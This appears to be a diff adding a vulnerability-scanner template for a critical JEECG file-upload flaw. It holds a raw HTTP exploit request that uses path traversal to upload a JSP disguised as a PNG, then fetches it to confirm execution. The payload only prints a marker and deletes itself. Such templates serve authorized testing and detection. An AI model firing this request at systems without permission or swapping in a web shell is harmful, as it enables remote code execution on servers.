@@ -1,0 +1,46 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - status_code_1 == 200
+            - status_code_2 == 200 && contains(body_2, 'HelloWorld')
+          type: dsl
+      matchers-condition: or
+      raw:
+        - |-
+          POST /api/../commonController.do?parserXml HTTP/1.1
+          Host: {{Hostname}}
+          Accept-Encoding: gzip, deflate
+          Content-Length: 463
+          User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
+          Connection: close
+
+          ------WebKitFormBoundarygcflwtei
+          Content-Disposition: form-data; name="name"
+
+          zW9YCa.png
+          ------WebKitFormBoundarygcflwtei
+          Content-Disposition: form-data; name="documentTitle"
+
+          blank
+          ------WebKitFormBoundarygcflwtei
+          Content-Disposition: form-data; name="file"; filename="zW9YCa.jsp"
+          Content-Type: image/png
+
+          <% out.println("HelloWorld");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+          ------WebKitFormBoundarygcflwtei--
+        - |-
+          GET /zW9YCa.jsp HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+          Connection: close
+id: jeecgboot-commoncontroller-parserxml-fileupload
+info:
+    author: M9
+    name: jeecgboot-commoncontroller-parserxml-fileupload
+    severity: critical
+    tags:
+        - JEECG
+        - parse
+        - Servlet
